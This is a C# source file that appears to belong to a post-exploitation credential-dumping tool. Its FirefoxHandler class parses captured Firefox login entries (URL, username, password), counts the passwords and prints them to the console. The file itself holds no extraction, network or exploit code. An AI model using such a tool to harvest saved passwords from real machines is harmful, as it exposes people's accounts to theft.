﻿using System;
using System.Collections.Generic;
using System.Linq;
using System.Text;
using System.Threading;
using System.Threading.Tasks;
using PS03.PostOperation;

namespace ConsoleApplication1
{
    public class FirefoxHandler
    {
        Mutex mtx = new Mutex();
        bool first = true;
        private PasswordCounter pwc;

        public FirefoxHandler(PasswordCounter PWC)
        {
            pwc = PWC;
        }
        public void Handle(string data)
        {
            int actMark = 0;
            int usrMark = 0;
            int pasMark = 0;

            actMark = data.IndexOf("ACTION=") + ("ACTION=").Length;
            usrMark = data.IndexOf("USER=");
            pasMark = data.IndexOf("PASS=");

            string Action = data.Substring(actMark, usrMark - actMark);

            string User = data.Substring(usrMark + ("USER=").Length, pasMark - (usrMark + ("USER=").Length));

            string Password = data.Substring(pasMark + ("PASS=").Length, data.Length - (pasMark + ("PASS=").Length));
            pwc.Add(Password);
            Print(Action, User, Password);

        }
        private void Print(string action, string user, string pass)
        {
            mtx.WaitOne();
            if (first)
            {
                Console.WriteLine();
                printCenterWhite("# ---------------------- Firefox Profiles ---------------------- #");
            }
            first = false;

            Console.WriteLine();
            Console.ForegroundColor = ConsoleColor.Green;
            Console.Write("URL:\t\t");
            printRed(action);
            Console.Write("Username:\t");
            printRed(user);
            Console.Write("Password:\t");
            printRed(pass);
            //   printCenterRed("# ---------------------- #");


            Console.ResetColor();
            mtx.ReleaseMutex();

        }

        private void printRed(string data)
        {
            Console.ForegroundColor = ConsoleColor.Red;
            Console.WriteLine(data);
            Console.ForegroundColor = ConsoleColor.Green;

        }

        private void printCenterWhite(string data)
        {
            Console.ForegroundColor = ConsoleColor.White;
            Console.SetCursorPosition((Console.WindowWidth - data.Length) / 2, Console.CursorTop);
            Console.WriteLine(data);
            Console.ForegroundColor = ConsoleColor.Green;

        }
    }
}

